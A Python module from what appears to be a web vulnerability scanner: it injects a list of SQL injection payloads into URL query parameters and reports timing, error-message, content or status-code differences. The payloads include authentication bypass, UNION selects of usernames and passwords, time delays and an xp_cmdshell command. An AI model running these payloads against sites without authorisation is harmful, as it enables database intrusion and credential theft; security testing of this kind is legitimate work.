import requests
import time
from colorama import Fore
from utils.seperate_urls import separate_urls
from utils.log_info import log_info

def check_sql_injection(urls):
  """Check for SQL Injection vulnerability using a wide range of payloads and methods."""
  urls_with_query, _ = separate_urls(urls=urls)

  if not urls_with_query:
    print(Fore.RED + "No URLs with query parameters found to check for SQL Injection.")
    return False

  sql_injection_detected = False

  # List of payloads to test SQL Injection
  payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "' OR 'a'='a",
    "' OR 'a'='a' --",
    "' OR 1=1#",
    "' OR '1'='1' /*",
    "'; EXEC xp_cmdshell('ping 127.0.0.1') --",
    "'; WAITFOR DELAY '0:0:5' --",
    "'; SELECT * FROM users WHERE 'a'='a",
    "' AND 1=CONVERT(int, (SELECT @@version)) --",
    "' AND 1=1 UNION SELECT NULL, username, password FROM users --",
    "' AND (SELECT COUNT(*) FROM information_schema.tables) > 5 --",
    "' AND 1=1;--",
    "' UNION ALL SELECT NULL, NULL, NULL --"
  ]

  for url_params in urls_with_query:
    original_response = requests.get(url_params)
    original_content = original_response.text
    original_status_code = original_response.status_code

    for payload in payloads:
      try:
        if '=' in url_params:
          base_url, _ = url_params.split('=', 1)
          malicious_url = base_url + '=' + payload
        else:
          malicious_url = url_params + payload

        # Send request with malicious payload
        start_time = time.time()
        response = requests.get(malicious_url)
        elapsed_time = time.time() - start_time

        # Check for SQL error messages in response content
        sql_error_indicators = [
          "sql syntax", "sql error", "sql warning", "unclosed quotation mark",
          "quoted string not properly terminated", "mysql_fetch", "mysql_num_rows",
          "sqlsrv_query", "sqlite3_prepare", "pg_query", "database error",
          "sql exception", "error in SQL syntax", "unexpected token", "syntax error"
        ]

        # Check for significant delay in response
        if elapsed_time > 5:
          log_info("success", f"Significant delay detected with payload '{payload}' at {malicious_url}. Potential SQL Injection vulnerability.")
          sql_injection_detected = True

        if any(error in response.text.lower() for error in sql_error_indicators):
          log_info("success", f"SQL Injection vulnerability detected with payload '{payload}' at {malicious_url}")
          sql_injection_detected = True

        # Check for changes in response content
        if response.text != original_content:
          log_info("ifon", f"Content change detected with payload '{payload}' at {malicious_url}. Potential SQL Injection vulnerability.")
          sql_injection_detected = True

        # Check for different status codes
        if response.status_code != original_status_code:
          log_info("info",  f"Different status code detected with payload '{payload}' at {malicious_url}. Potential SQL Injection vulnerability.")
          sql_injection_detected = True

      except requests.RequestException as e:
        print(Fore.RED + f"An error occurred: {e}")

  return sql_injection_detected
